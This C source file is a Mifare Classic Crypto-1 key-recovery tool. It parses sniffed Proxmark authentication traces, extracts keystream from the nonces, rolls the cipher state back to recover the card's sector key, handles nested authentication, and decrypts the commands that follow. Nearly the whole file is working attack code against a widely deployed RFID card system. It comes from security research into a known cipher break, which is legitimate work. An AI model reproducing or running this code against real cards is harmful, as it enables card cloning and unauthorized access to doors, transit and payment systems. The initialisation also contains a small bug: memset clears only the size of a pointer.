/********************************************************************
* practical.c
********************************************************************
* Find a key from Philips/NXP Mifare Crypto-1 saved traces using
* modified Proxmark firmware.
*
* Code Implementation by Kyle Penri-Williams
* kyle.penriwilliams@gmail.com
*/

//#include "practical.h"
#include "crypto1.h"

void parse_state_init(parse_state_t* ps)
{
    memset(ps,0,sizeof(ps));
    ps->state=S_NONE;
}

uint8_t parse_replayfile(parse_state_t* ps,uint8_t * filename)
{

//Variables
    int i;


//File variables
    FILE *ftxt;
    uint8_t str[200];
    uint8_t * strcursor;

//parsed vars
    uint32_t l_timestamp=0;
    uint32_t l_istag=0;
    uint32_t l_parity=0;
    uint8_t l_frame[64];
    uint32_t l_len=0;
    uint32_t enccmd[6];
    uint32_t pt_uint32;
    uint32_t ks_uint32;
    uint8_t pt_uint8[4];

//Test input/output variables
    if (ps==NULL)
    {
        printf("Internal Error: parse_replayfile. NULL parameter\n");
        return 0;
    }

//Open File
    if (!(ps->f))
    {
        if (!filename)
        {
            printf("Internal Error: parse_replayfile. NULL filename\n");
        }
        ps->f=fopen(filename,"r");
        if (!(ps->f))
        {
            printf("Internal Error: parse_replayfile. Could not open file %s\n",filename);
            return 0;
        }
    }

//printf("s\n");
    while (fgets(str,200,ps->f))
    {
//printf("w\n");
//Parsing
        l_parity=0;
        l_len=0;
        strcursor=str;
        sscanf(strcursor,"%08x,%01x,%08x,%02x,",&l_timestamp,&l_istag,&l_parity,&l_len);
        strcursor+=23;

        for (i=0; i<l_len; i++)
        {
            sscanf(strcursor," %02x",&(l_frame[i]));
            strcursor+=3;
        }

//Beacon
//00000000,01, 52
//00000001,02, 04 00
        if ( (l_len==0x01 && l_frame[0]==0x52) ||
                (l_len==0x02 && l_frame[0]==0x04 && l_frame[1]==0x00))
        {
            if (ps->state>=S_AUTHPASS2)
            {
                break;
            }
            else
            {
                ps->state = S_SELECT;
            }
        }


        switch (ps->state)
        {
        case S_SELECT:
//00000121,09, 93 70 a4 f0 38 ef 83 cd f5
            if ( l_len==0x09 && l_frame[0]==0x93 && l_frame[1]==0x70)
            {
                ps->state = S_SELECTED;
//Extract UID
                ps->uid=(l_frame[2]<<24) | (l_frame[3]<<16) | (l_frame[4]<<8) | (l_frame[5]);
            }
            break;
        case S_SELECTED:
//00000001,03, 08 b6 dd
            if ( l_len==0x03 && l_frame[0]==0x08 && l_frame[1]==0xb6 && l_frame[2]==0xdd)
            {
                ps->state = S_AUTHREQ;
            }
            break;
        case S_AUTHREQ:
//00000003,04, 61 02 3f 41
            if ( l_len==0x04 && (l_frame[0]==0x60 || l_frame[0]==0x61 ))
            {
                ps->state = S_AUTHPASS1;
//Save Authentication info
                ps->keyinfo=((l_frame[0]&0x0f)<<8)|l_frame[1];
            }
            break;
        case S_AUTHPASS1:

//0000000c,04, 7d ca fe 57
            if ( l_len==0x04 )
            {
                ps->state = S_AUTHPASS2;
//Save Authentication Pass 1 (tag nonce)
                ps->prev_nonce_tag=ps->nonce_tag;

                ps->prev_timestamp_tag=ps->timestamp_tag;
                ps->timestamp_tag = l_timestamp;

                ps->parity_tag=l_parity;
                ps->nonce_tag=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);
                ps->nested=0;
            }
            break;
        case S_AUTHPASS2:
            if ( l_len==0x08 )
            {
                ps->state = S_AUTHPASS3;
//Save Authentication Pass 1 (tag nonce)
                ps->nonce_reader=0;
                ps->nonce_reader=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);
//Extract Keystream from reader nonce_tag response
                pt_uint32=(l_frame[4]<<24) | (l_frame[5]<<16) | (l_frame[6]<<8) | (l_frame[7]);
                ks_uint32=(pt_uint32)^nonce_get_successor_m(ps->nonce_tag,64);
                ps->ks=((ks_uint32)&0xff)<<24 | ((ks_uint32>>8)&0xff)<<16 | ((ks_uint32>>16)&0xff)<<8 | ((ks_uint32>>24)&0xff);
                ps->len=32;
            }
            break;
        case S_AUTHPASS3:
            if ( l_len==0x04 )
            {
                ps->state = S_ENCCMD;

//Extract Keystream from tag nonce_tag response
                pt_uint32=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);
                ks_uint32=(pt_uint32)^nonce_get_successor_m(ps->nonce_tag,96);
                ps->ks=(ps->ks) | ((uint64_t)((ks_uint32)&0xff)<<24 | ((ks_uint32>>8)&0xff)<<16 | ((ks_uint32>>16)&0xff)<<8 | ((ks_uint32>>24)&0xff))<<32;
                ps->len+=32;

                return 1;
            }
            break;
        case S_ENCCMD:
            if ( l_len==0x01 )
            {

                printf("%02x\n",lfsr_encrypt_nibble(&(ps->lfsr))^l_frame[0]);
            }
            else if (l_len > 0x01 )
            {
                for (i=0; i<l_len; i++)
                {
                    l_frame[i]^=lfsr_encrypt_byte(&(ps->lfsr));
                    printf("%02x ",l_frame[i]);
                }
                if (l_len==0x04 && (l_frame[0]==0x60 || l_frame[0]==0x61))
                {
                    ps->state = S_NESTEDAUTHPASS1;
//Save Authentication info
                    ps->keyinfo=((l_frame[0]&0x0f)<<8)|l_frame[1];
                }
                printf("\n");
            }
            break;
        case S_NESTEDAUTHPASS1:

//0000000c,04, 7d ca fe 57
            if ( l_len==0x04 )
            {
                ps->state = S_NESTEDAUTHPASS2;
//Save Authentication Pass 1 (tag nonce)
                ps->prev_nonce_tag=ps->nonce_tag;

                ps->prev_timestamp_tag=ps->timestamp_tag;
                ps->timestamp_tag = l_timestamp;

                ps->parity_tag=l_parity;
                ps->nonce_tag=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);
                ps->nested=1;
                ps->ks=0;
                ps->len=0;
            }
            break;
        case S_NESTEDAUTHPASS2:
            if ( l_len==0x08 )
            {
                ps->state = S_NESTEDAUTHPASS3;
//Save Authentication Pass 2 (reader nonce + suc2)
                ps->parity_reader=(l_parity>>4)&0xf;
                ps->nonce_reader=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);

                ps->nonce_tagsuc2=(l_frame[4]<<24) | (l_frame[5]<<16) | (l_frame[6]<<8) | (l_frame[7]);
                ps->parity_tagsuc2=l_parity&0xf;
            }
            break;
        case S_NESTEDAUTHPASS3:
            if ( l_len==0x04 )
            {
                ps->state = S_ENCCMD;

//Save Authentication Pass 3 (suc3)
                ps->nonce_tagsuc3=(l_frame[0]<<24) | (l_frame[1]<<16) | (l_frame[2]<<8) | (l_frame[3]);
                ps->parity_tagsuc3=l_parity&0xf;
                return 1;
            }
            break;
        case S_NONE:
        default:
            break;
        }
    }



    return 0;
}

/*
* ------------------------------------------------------------------
*
* Main Function
*
* ------------------------------------------------------------------
*/


#define REPLAY_FILE_PATH "D:\\replay.txt"

int main()
{

    /*****************
    Parsing
    *****************/
    parse_state_t ps;

    parse_state_init(&ps);

    /*****************
    Decrypto1
    *****************/

    uint64_t result;
    uint32_t resultcount;
    int i,j;
    table_entry_t results;
    table_entry_t *cursor;

    while (parse_replayfile(&ps,REPLAY_FILE_PATH))
    {
        result=0;
        resultcount=0;

        if (!ps.nested)
        {
            printf("=== Parsing ===\n");
            printf("Simple Authentication\n");
            printf("UID:%08x\n",ps.uid);
            printf("KEY:%c\n",'A'+(ps.keyinfo>>8));
            printf("BLOCK:%02x\n",ps.keyinfo&0xff);
            printf("TAG:%08x\n",ps.nonce_tag);
            printf("READER:%08x\n",ps.nonce_reader);
            printf("KS:%08x%08x,len:%d\n",(uint32_t) (ps.ks >> 32),(uint32_t)(ps.ks&0xFFFFFFFF),ps.len);


            table_entry_init(&results);

            resultcount=recover_states(ps.ks,ps.len, &results,0);

            printf("%d Results\n ---\n",resultcount);

            cursor=results.next;

            for (i=0; cursor!=NULL && i<10 ; i++)
            {
                result=cursor->value;
                cursor=cursor->next;

//Rollback to Key
                lfsr_rollback_word(&result,ps.nonce_reader,1);
                uint32_t id_xor_rand = ps.uid ^ ps.nonce_tag;
                lfsr_rollback_word(&result,id_xor_rand,0);
                printf("Key State: %04x%08x\n",(uint32_t) ((result)>>
                        32),(uint32_t)((result) &0xFFFFFFFF));
            }

            if (resultcount!=1)
            {
                break;
            }

            result=results.next->value;
            lfsr_rollforward_m(&result,8*8);
            ps.lfsr=result;
            printf("----------\n");

        }
        else
        {

            printf("=== Parsing ===\n");
            printf("Nested Authentication\n");
            printf("UID:%08x\n",ps.uid);
            printf("KEY:%c\n",'A'+(ps.keyinfo>>8));
            printf("BLOCK:%02x\n",ps.keyinfo&0xff);
            printf("TAG:%08x (%02x)\n",ps.nonce_tag,ps.parity_tag);
            printf("READER:%08x (%02x)\n",ps.nonce_reader,ps.parity_reader);
            printf("TAGSUC2:%08x (%02x)\n",ps.nonce_tagsuc2,ps.parity_tagsuc2);
            printf("TAGSUC3:%08x (%02x)\n",ps.nonce_tagsuc3,ps.parity_tagsuc3);
            printf("PREV TAG:%08x\n",ps.prev_nonce_tag);
            printf("TIME DIFF:%d\n",ps.timestamp_tag-ps.prev_timestamp_tag);


            nonce_find_tagnonce(ps.parity_tag,ps.nonce_tag,
                                ps.parity_tagsuc2,ps.nonce_tagsuc2,
                                ps.parity_tagsuc3,ps.nonce_tagsuc3,
                                ps.prev_nonce_tag,
                                ps.timestamp_tag-ps.prev_timestamp_tag);



        }
    }

    return 0;
}

static uint16_t UpdateCrc14443(uint8_t ch, uint16_t *lpwCrc)
{
    ch = (ch ^ (uint8_t ) ((*lpwCrc) & 0x00FF));
    ch = (ch ^ (ch << 4));
    *lpwCrc =
        (*lpwCrc >> 8) ^ ((uint16_t) ch << 8) ^
        ((uint16_t) ch << 3) ^ ((uint16_t) ch >> 4);
    return (*lpwCrc);
}
//
static void ComputeCrc14443A( uint8_t *Data, int Length,
                              uint8_t *TransmitFirst, uint8_t *TransmitSecond)
{
    uint8_t chBlock;
    uint16_t wCrc;
    wCrc = 0x6363; /* ITU-V.41 */

    do
    {
        chBlock = *Data++;
        UpdateCrc14443(chBlock, &wCrc);
    }
    while (--Length);

    *TransmitFirst = (uint8_t) (wCrc & 0xFF);
    *TransmitSecond = (uint8_t) ((wCrc >> 8) & 0xFF);
    return;
}